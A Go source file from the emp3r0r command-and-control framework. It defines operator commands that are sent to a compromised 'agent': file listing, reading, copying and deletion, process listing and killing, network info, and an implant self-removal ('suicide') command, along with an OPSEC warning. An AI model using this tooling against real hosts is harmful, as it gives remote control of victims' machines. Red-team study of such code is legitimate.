package operator

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

func CmdLs(_ *cobra.Command, args []string) {
	dst := "."
	if len(args) != 0 {
		dst = args[0]
	}

	CmdFSCmdDst("ls", dst)
}

func CmdPwd(_ *cobra.Command, _ []string) {
	executeCmd("pwd")
}

func CmdCd(_ *cobra.Command, args []string) {
	activeAgent := agents.MustGetActiveAgent()
	if activeAgent == nil {
		logging.Errorf("cd: no active target")
		return
	}

	dst := args[0]
	activeAgent.CWD = dst
	executeCmd(fmt.Sprintf("cd --dst %s", dst))
}

func CmdCat(_ *cobra.Command, args []string) {
	dst := args[0]
	CmdFSCmdDst("cat", dst)
}

func CmdCp(_ *cobra.Command, args []string) {
	src := args[0]
	dst := args[1]

	CmdFSCmdSrcDst("cp", src, dst)
}

func CmdRm(_ *cobra.Command, args []string) {
	dst := args[0]
	CmdFSCmdDst("rm", dst)
}

func CmdMkdir(_ *cobra.Command, args []string) {
	dst := args[0]
	CmdFSCmdDst("mkdir", dst)
}

func CmdMv(_ *cobra.Command, args []string) {
	src := args[0]
	dst := args[1]
	CmdFSCmdSrcDst("mv", src, dst)
}

func CmdPs(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetInt("pid")
	user, _ := cmd.Flags().GetString("user")
	name, _ := cmd.Flags().GetString("name")
	cmdLine, _ := cmd.Flags().GetString("cmdline")

	cmdArgs := "ps"
	if pid != 0 {
		cmdArgs = fmt.Sprintf("%s --pid %d", cmdArgs, pid)
	}
	if user != "" {
		cmdArgs = fmt.Sprintf("%s --user %s", cmdArgs, user)
	}
	if name != "" {
		cmdArgs = fmt.Sprintf("%s --name %s", cmdArgs, name)
	}
	if cmdLine != "" {
		cmdArgs = fmt.Sprintf("%s --cmdline %s", cmdArgs, cmdLine)
	}
	logging.Warningf("OPSEC: ps recorded as process/thread enumeration")
	executeCmd(cmdArgs)
}

func CmdNetHelper(_ *cobra.Command, _ []string) {
	executeCmd("net_helper")
}

func CmdSuicide(_ *cobra.Command, _ []string) {
	executeCmd("suicide")
}

func CmdKill(cmd *cobra.Command, args []string) {
	if len(args) == 0 {
		logging.Errorf("kill: no PID specified")
		return
	}

	// Validate that all arguments are valid PIDs
	for _, pidStr := range args {
		if pid, err := strconv.Atoi(pidStr); err != nil || pid <= 0 {
			logging.Errorf("kill: invalid PID '%s': must be a positive integer", pidStr)
			return
		}
	}

	// Send kill command with space-separated PIDs as positional arguments
	executeCmd(fmt.Sprintf("kill %s", strings.Join(args, " ")))
}

func CmdResetLayout(_ *cobra.Command, _ []string) {
	err := cli.ResetPaneLayout()
	if err != nil {
		logging.Errorf("Failed to reset pane layout: %v", err)
	} else {
		logging.Printf("Pane layout reset to default proportions")
	}
}

func CmdFSCmdDst(cmd, dst string) {
	executeCmd(fmt.Sprintf("%s --dst '%s'", cmd, dst))
}

func CmdFSCmdSrcDst(cmd, src, dst string) {
	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmd, src, dst))
}

func executeCmd(cmd string) {
	activeAgent := agents.MustGetActiveAgent()
	if activeAgent == nil {
		logging.Errorf("%s: no active target", cmd)
		return
	}
	ctx := &c2context.C2Context{
		Target:    activeAgent,
		OpSession: OPERATOR_SESSION,
		Flags:     make(map[string]string),
	}
	ctx.Flags["cmd_to_exec"] = cmd
	modules.ModuleCmd(ctx)
}
